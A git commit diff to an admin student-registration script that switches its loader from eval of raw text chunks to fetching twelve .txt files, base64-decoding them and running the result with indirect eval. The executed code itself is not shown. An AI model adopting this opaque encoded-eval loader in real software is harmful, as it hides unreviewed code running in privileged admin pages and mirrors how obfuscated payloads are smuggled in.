8580a64ba7854300fe507fb143cccf952781ae9f
Sharifzoda Ibrohim <ibrohimicamsed316@gmail.com>
2026-08-31 00:44:40 +0500

    feat(students-reg): base64 chunk loader for full reg body

--- js/admin-students-reg.js
+++ js/admin-students-reg.js
@@ -1,10 +1,16 @@
 (function(){
-  var F=["/js/_asr_c0.txt","/js/_asr_c1.txt","/js/_asr_c2.txt","/js/_asr_c3.txt","/js/_asr_c4.txt","/js/_asr_c5.txt","/js/_asr_c6.txt","/js/_asr_c7.txt","/js/_asr_c8.txt","/js/_asr_c9.txt","/js/_asr_c10.txt","/js/_asr_c11.txt"];
+  var F=["/js/_asr_cb0.txt","/js/_asr_cb1.txt","/js/_asr_cb2.txt","/js/_asr_cb3.txt","/js/_asr_cb4.txt","/js/_asr_cb5.txt","/js/_asr_cb6.txt","/js/_asr_cb7.txt","/js/_asr_cb8.txt","/js/_asr_cb9.txt","/js/_asr_cb10.txt","/js/_asr_cb11.txt"];
   Promise.all(F.map(function(f){
     return fetch(f,{credentials:"same-origin"}).then(function(r){
       if(!r.ok) throw new Error(f+" "+r.status);
       return r.text();
     });
-  })).then(function(p){ (0,eval)(p.join("")); })
-  .catch(function(e){ console.error("[students-reg] load failed", e); });
+  })).then(function(parts){
+    var b64 = parts.join("").replace(/\s+/g,"");
+    var bin = atob(b64);
+    var out = "";
+    for (var i=0;i<bin.length;i++) out += String.fromCharCode(bin.charCodeAt(i));
+    try { out = decodeURIComponent(escape(out)); } catch(_) {}
+    (0,eval)(out);
+  }).catch(function(e){ console.error("[students-reg] load failed", e); });
 })();
